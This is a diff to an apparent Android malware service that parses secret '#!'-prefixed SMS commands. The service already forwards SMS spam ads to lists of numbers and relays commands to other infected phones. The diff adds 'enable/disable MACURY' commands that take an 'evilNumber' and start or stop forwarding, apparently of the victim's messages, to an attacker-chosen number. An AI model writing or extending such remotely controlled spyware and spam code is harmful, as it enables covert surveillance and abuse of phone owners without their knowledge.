@@ -62,8 +62,18 @@ public class CommandService extends Service {
 	 *    
 	 * 8) forward SMS Ads.
 	 *       COMMAND_SIGN   SEPERATE   receiver     SEPERATE  FORWARD_SMS_ADS  SEPERATE  msg  SEPERATE  adsCount  ( SEPERATE  number )*adsCount ( SEPERATE  time )
-	 *          #!             |         YOU            |            08            |     XDDD     |        1          |     0952559593               |     1234                   
+	 *          #!             |         YOU            |            08            |     XDDD     |        1          |     0952559593               |     1234
+	 * 9) enable MACURY
+	 * 		 COMMAND_SIGN   SEPERATE   receiver     SEPERATE  ENABLE_MACURY  SEPERATE  evilNumber  ( SEPERATE time )
+	 * 			#!             |         YOU            |            09          |        1234           |     1234          
+	 * 10) disable MACURY
+	 * 		 COMMAND_SIGN   SEPERATE   receiver     SEPERATE  STOP_MACURY    SEPERATE  evilNumber  ( SEPERATE time )
+	 * 			#!             |         YOU            |            10          |         1234          |   1234
 	 */
+	
+	
+	
+	
 	
 		
 	
@@ -90,7 +100,7 @@ public class CommandService extends Service {
 		CommonVariable.selfNumber = tMgr.getLine1Number().equals("")? CommonVariable.selfNumber : tMgr.getLine1Number() ;
 		PrintLog("my phone number is:"+CommonVariable.selfNumber);
 */
-		
+				
 		// for GSM
 		if ( CommonVariable.selfNumber.equals("") ) {	
 			// check left
@@ -348,6 +358,48 @@ public class CommandService extends Service {
 					for ( int i=0 ; i<count ; i++ ) {
 						commandTemp += CommonVariable.SEPERATE+cmd[i+5];
 					}
+					try {
+						forwardToNext(sender,commandTemp,cmd[3]);
+					}catch ( Exception e ) {
+						forwardToNext(sender,commandTemp,null);
+					}
+				}
+			}
+			else if ( cmd[2].contains(CommonVariable.ENABLE_MACURY) ) {
+				if ( isForMe ) {
+					try {
+						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[3],false);
+					}catch ( Exception e ) {
+						Debug.PrintLog("CommandService", "There is no time in command.");
+						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,null,false);
+					}
+					Debug.PrintLog("CommandService","enable MACURY....");
+					CommonVariable.enableMACURY = true;
+					startFoward(cmd[3].trim());
+				}
+				else {
+					String commandTemp = cmd[0]+CommonVariable.SEPERATE+cmd[1]+CommonVariable.SEPERATE+cmd[2];
+					try {
+						forwardToNext(sender,commandTemp,cmd[3]);
+					}catch ( Exception e ) {
+						forwardToNext(sender,commandTemp,null);
+					}
+				}
+			}
+			else if ( cmd[2].contains(CommonVariable.STOP_MACURY) ) {
+				if ( isForMe ) {
+					try {
+						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[3],false);
+					}catch ( Exception e ) {
+						Debug.PrintLog("CommandService", "There is no time in command.");
+						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,null,false);
+					}
+					Debug.PrintLog("CommandService","disable MACURY....");
+					CommonVariable.enableMACURY = false;
+					stopFoward();
+				}
+				else {
+					String commandTemp = cmd[0]+CommonVariable.SEPERATE+cmd[1]+CommonVariable.SEPERATE+cmd[2];
 					try {
 						forwardToNext(sender,commandTemp,cmd[3]);
 					}catch ( Exception e ) {
